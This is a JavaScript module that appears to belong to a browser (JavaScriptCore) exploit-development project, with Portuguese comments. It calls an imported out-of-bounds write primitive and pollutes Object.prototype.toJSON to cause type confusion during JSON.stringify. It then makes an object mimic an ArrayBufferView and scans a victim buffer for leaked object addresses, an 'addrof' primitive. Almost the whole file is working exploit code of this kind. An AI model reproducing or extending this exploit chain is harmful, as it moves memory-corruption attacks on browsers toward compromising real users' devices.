// js/script3/testArrayBufferVictimCrash.mjs (v84_AggressiveArrayBufferViewManipulation)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
// import { JSC_OFFSETS } from '../config.mjs'; // Poderia ser usado para offsets de ArrayBufferView

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V84_AABVM = "OriginalHeisenbug_TypedArrayAddrof_v84_AggressiveABViewManipulation";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE_V84 = 0xFFFFFFFF; 

let object_to_leak_A_v84 = null;
let object_to_leak_B_v84 = null;
let victim_typed_array_ref_v84 = null; 
let probe_call_count_v84 = 0;
let marker_M1_ref_v84 = null; 
let marker_M2_ref_v84 = null; 
let details_of_M2_interaction_v84 = null; 
const PROBE_CALL_LIMIT_V84 = 5; 


function toJSON_TA_Probe_AggressiveABView() {
    probe_call_count_v84++;
    const call_num = probe_call_count_v84;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V84_AggressiveABView",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v84),
        this_is_M1: (this === marker_M1_ref_v84 && marker_M1_ref_v84 !== null),
        this_is_M2: (this === marker_M2_ref_v84 && marker_M2_ref_v84 !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    // Atualizar details_of_M2_interaction_v84 se esta chamada for sobre M2, ou a última chamada
    if (current_call_log_info.this_is_M2 || !details_of_M2_interaction_v84 || call_num > (details_of_M2_interaction_v84.call_number || 0) ) {
        details_of_M2_interaction_v84 = current_call_log_info;
    }
    logS3(`[PROBE_V84] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V84) { return { recursion_stopped_v84: true }; }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            marker_M2_ref_v84 = { marker_id_v84: "M2_V84_Target" }; 
            marker_M1_ref_v84 = { marker_id_v84: "M1_V84_Container", payload_M2: marker_M2_ref_v84 };
            return marker_M1_ref_v84;
        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            logS3(`[PROBE_V84] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v84}. Attempting ABView Mimic...`, "vuln");
            current_call_log_info.m2_interaction_summary = { 
                abview_mimic_attempted: false, 
                write_to_mimic_this_0_attempted: false,
                error: null, 
                keys_after: "N/A" 
            };
            
            try {
                this.buffer = victim_typed_array_ref_v84.buffer; // Apontar para o buffer da vítima
                this.byteOffset = 0;
                this.byteLength = VICTIM_BUFFER_SIZE;
                current_call_log_info.m2_interaction_summary.abview_mimic_attempted = true;
                logS3(`[PROBE_V84]   'this' (M2) properties (buffer, byteOffset, byteLength) set to mimic ArrayBufferView.`, "info");

                // Tentar escrever em 'this[0]' como se fosse um TypedArray/DataView sobre o buffer da vítima
                if (object_to_leak_A_v84) {
                    this[0] = object_to_leak_A_v84; 
                    logS3(`[PROBE_V84]   Attempted this[0] = object_A on mimicked M2.`, "info");
                    current_call_log_info.m2_interaction_summary.write_to_mimic_this_0_attempted = true;
                }
            } catch (e_mimic) {
                logS3(`[PROBE_V84]   Error during ABView mimic/write on M2: ${e_mimic.message}`, "error");
                current_call_log_info.m2_interaction_summary.error = e_mimic.message;
            }
            try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
            logS3(`[PROBE_V84] Call #${call_num}: M2 ('this') modification attempt done. Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
            
            return this; // Retorna M2 modificado
        }
    } catch (e) { current_call_log_info.error_in_probe = e.message; }
    
    return { generic_marker_v84: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_AggressiveArrayBufferViewManipulation() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V84_AABVM}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AggressiveABViewManipulation) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V84_AABVM} Init...`;

    // Apenas um valor OOB para este teste focado na manipulação de M2
    const current_oob_value = OOB_WRITE_VALUE_V84; 
    const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;

    probe_call_count_v84 = 0;
    victim_typed_array_ref_v84 = null; 
    marker_M1_ref_v84 = null;
    marker_M2_ref_v84 = null;
    details_of_M2_interaction_v84 = null;
    object_to_leak_A_v84 = { marker_A_v84: `LeakA_Val${toHex(current_oob_value)}`}; 
    object_to_leak_B_v84 = { marker_B_v84: `LeakB_Val${toHex(current_oob_value)}`}; // Para this[1] se necessário

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    
    let addrof_Victim_A = { success: false, msg: "Victim[0]: Default" };
    let addrof_Victim_B = { success: false, msg: "Victim[1]: Default" };
    const fillPattern = 0.84848484848484;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
        logS3(`  OOB Write done for Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
        await PAUSE_S3(100);

        victim_typed_array_ref_v84 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v84.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v84 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AggressiveABView, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v84); 
            logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
            try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e_parse) { /* ... */ }
            
            logS3(`  EXECUTE: Details of M2 interaction (if occurred): ${details_of_M2_interaction_v84 ? JSON.stringify(details_of_M2_interaction_v84) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

            let heisenbugOnM2 = details_of_M2_interaction_v84?.this_is_M2 && details_of_M2_interaction_v84?.this_type === "[object Object]";
            logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                
            logS3("STEP 3: Checking victim buffer for addrof...", "warn", FNAME_CURRENT_ITERATION);
            const val_A = float64_view_on_victim_buffer[0];
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x000F0000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_Victim_A.success = true; addrof_Victim_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_Victim_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }
            logS3(`  Value read from victim_buffer[0]: ${val_A} (${temp_A_int64.toString(true)})`, "leak");

            const val_B = float64_view_on_victim_buffer[1];
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
             if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x000F0000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_Victim_B.success = true; addrof_Victim_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_Victim_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }
            logS3(`  Value read from victim_buffer[1]: ${val_B} (${temp_B_int64.toString(true)})`, "leak");


            if (addrof_Victim_A.success || addrof_Victim_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V84_AABVM}: AddrInVictim SUCCESS!`;
            } else if (heisenbugOnM2) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V84_AABVM}: M2_TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V84_AABVM}: No M2_TC?`;
            }

        } catch (e_str) { errorCapturedMain = e_str;
        } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
    } catch (e_outer) { errorCapturedMain = e_outer;
    } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Iteration Val${toHex(current_oob_value)} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Addrof Victim A: Success=${addrof_Victim_A.success}, Msg='${addrof_Victim_A.msg}'`, addrof_Victim_A.success ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
    logS3(`Addrof Victim B: Success=${addrof_Victim_B.success}, Msg='${addrof_Victim_B.msg}'`, addrof_Victim_B.success ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
        
    return { 
        errorOccurred: errorCapturedMain, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_M2_interaction_v84 ? JSON.parse(JSON.stringify(details_of_M2_interaction_v84)) : null, 
        total_probe_calls: probe_call_count_v84,
        addrof_A_result: addrof_Victim_A, // Renomeado para o runner
        addrof_B_result: addrof_Victim_B  // Renomeado para o runner
    };
}
